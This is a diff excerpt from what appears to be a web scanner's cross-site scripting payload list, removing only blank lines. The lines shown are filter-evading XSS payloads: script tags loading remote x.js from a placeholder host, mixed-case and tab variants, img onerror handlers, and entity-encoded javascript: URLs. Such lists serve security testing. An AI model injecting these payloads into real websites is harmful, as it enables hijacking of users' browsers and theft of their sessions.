@@ -8,16 +8,13 @@
 <ScRiPt src=http://__XSS__/x.js></sCrIpT>
 <script[TAB]src=http://__XSS__/x.js></script>
 <ScRiPt[TAB]src=http://__XSS__/x.js></sCrIpT>
-
 <img src=. onerror=alert("__XSS__")>
 <img src=. onerror=alert('__XSS__')>
 <img src=. onerror=String.fromCharCode(0,__XSS__,1)>
 <img[TAB]src=.[TAB]onerror=String.fromCharCode(0,__XSS__,1)>
-
 <img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;__XSS__;&#39;&#41;>
 <img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27__XSS__&#x27&#x29>
 <img[TAB]src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27__XSS__&#x27&#x29>
-
 <script >alert('__XSS__')</script >
 <script >alert("__XSS__")</script >
 <script >String.fromCharCode(0,__XSS__,1)</script >
